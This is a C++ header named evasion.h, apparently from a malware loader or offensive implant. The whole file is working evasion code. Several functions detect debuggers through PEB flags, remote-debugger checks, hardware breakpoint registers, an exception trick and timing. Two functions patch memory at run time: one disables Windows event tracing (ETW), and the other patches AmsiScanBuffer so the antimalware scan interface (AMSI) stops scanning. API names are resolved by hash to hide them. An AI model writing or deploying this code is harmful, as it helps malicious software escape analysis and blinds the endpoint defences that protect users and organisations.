// language: C++, file: src/evasion.h
#pragma once
#include <windows.h>
#include <intrin.h>
#include <cstdint>
#include "nt.h"

namespace evade {

    inline bool peb_flag() {
        auto peb = (uint8_t*)__readgsqword(0x60);
        if (peb[2]) return true;
        uint32_t ntglobal = *(uint32_t*)(peb + 0xBC);
        return (ntglobal & 0x70) != 0;
    }

    inline bool remote_present() {
        BOOL b = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &b);
        return b != 0;
    }

    inline bool hw_bp() {
        CONTEXT c = {}; c.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (!GetThreadContext(GetCurrentThread(), &c)) return false;
        return c.Dr0 || c.Dr1 || c.Dr2 || c.Dr3;
    }

    inline bool bp_seh() {
        bool tripped = true;
        __try { RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nullptr); }
        __except (GetExceptionCode() == EXCEPTION_BREAKPOINT
                    ? EXCEPTION_EXECUTE_HANDLER
                    : EXCEPTION_CONTINUE_SEARCH) {
            tripped = false;
        }
        return tripped;
    }

    inline bool rdtsc_delta() {
        unsigned aux;
        uint64_t a = __rdtscp(&aux);
        volatile int x = 0; for (int i = 0; i < 64; i++) x += i;
        uint64_t b = __rdtscp(&aux);
        return (b - a) > 100000;
    }

    inline bool debugged() {
        return peb_flag() || remote_present() || hw_bp() || bp_seh() || rdtsc_delta();
    }

    inline void kill_etw() {
        auto ntdll = module_by_hash(fnv1a("ntdll.dll"));
        auto fn = (uint8_t*)export_by_hash(ntdll, fnv1a("EtwEventWrite"));
        if (!fn) return;
        DWORD old;
        VirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE, &old);
        *fn = 0xC3;
        VirtualProtect(fn, 1, old, &old);
    }

    inline void kill_amsi() {
        HMODULE amsi = GetModuleHandleA("amsi.dll");
        if (!amsi) amsi = LoadLibraryA("amsi.dll");
        if (!amsi) return;
        auto fn = (uint8_t*)export_by_hash(amsi, fnv1a("AmsiScanBuffer"));
        if (!fn) return;
        DWORD old;
        VirtualProtect(fn, 6, PAGE_EXECUTE_READWRITE, &old);
        uint8_t patch[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        memcpy(fn, patch, 6);
        VirtualProtect(fn, 6, old, &old);
    }
}
